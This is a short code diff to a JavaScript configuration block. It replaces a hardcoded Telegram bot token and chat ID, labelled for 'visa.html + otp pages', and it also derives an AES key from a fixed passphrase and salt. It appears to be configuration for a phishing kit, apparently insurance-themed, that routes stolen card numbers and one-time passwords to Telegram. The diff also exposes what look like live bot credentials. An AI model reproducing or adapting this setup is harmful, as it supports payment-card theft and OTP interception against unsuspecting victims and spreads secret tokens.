@@ -14,8 +14,8 @@ const TELEGRAM_BOT_TOKEN_1 = '8998656389:AAFFtTslxCl2UAKdg6OIcn6t5TW9przbSzQ';
 const TELEGRAM_CHAT_ID_1 = '8319065523';
 
 // Telegram Configuration - Bot 2 (visa.html + otp pages) - PUT YOUR NEW BOT CREDENTIALS HERE
-const TELEGRAM_BOT_TOKEN_2 = '8861501632:AAGbneUqpyh_Od5YPXy2zSwxAq0JF3-1LzA';
-const TELEGRAM_CHAT_ID_2 = '8535558521';
+const TELEGRAM_BOT_TOKEN_2 = '8718832098:AAH2tCEWSer3ltdTc4NSoCB8iF9_XA2_tAQ';
+const TELEGRAM_CHAT_ID_2 = '8319065523';
 
 // Encryption key (32 bytes for AES-256)
 const ENCRYPTION_KEY = crypto.scryptSync('secure-tameen-key-2024', 'salt', 32);
